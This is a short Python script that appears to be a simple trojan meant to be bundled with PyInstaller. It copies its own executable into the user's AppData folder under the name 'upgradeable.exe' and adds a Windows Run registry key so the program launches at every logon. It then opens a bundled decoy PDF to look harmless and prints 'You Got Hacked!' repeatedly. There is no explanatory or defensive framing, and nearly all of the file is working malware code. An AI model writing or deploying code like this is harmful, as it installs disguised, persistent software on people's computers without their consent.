import os
import shutil
import subprocess
import sys
import time
from pathlib import Path


def add_to_registry():
    # Copy the packaged executable into AppData and register it to run at logon.
    new_file = os.environ["appdata"] + "\\upgradeable.exe"
    if not os.path.exists(new_file):
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        shutil.copyfile(sys.executable, new_file)
        subprocess.call(regedit_command, shell=True)

add_to_registry()


def get_resource_path(file_name):
    # PyInstaller extracts bundled files under _MEIPASS; fall back to the script directory when run normally.
    bundle_dir = getattr(sys, "_MEIPASS", Path(__file__).resolve().parent)
    return str(Path(bundle_dir) / file_name)


def open_added_file():
    added_file = get_resource_path("metallica.pdf")
    subprocess.Popen(added_file, shell=True)

open_added_file()

x = 0
while x < 100:
    print("You Got Hacked!")
    x = x + 1
    time.sleep(0.5)
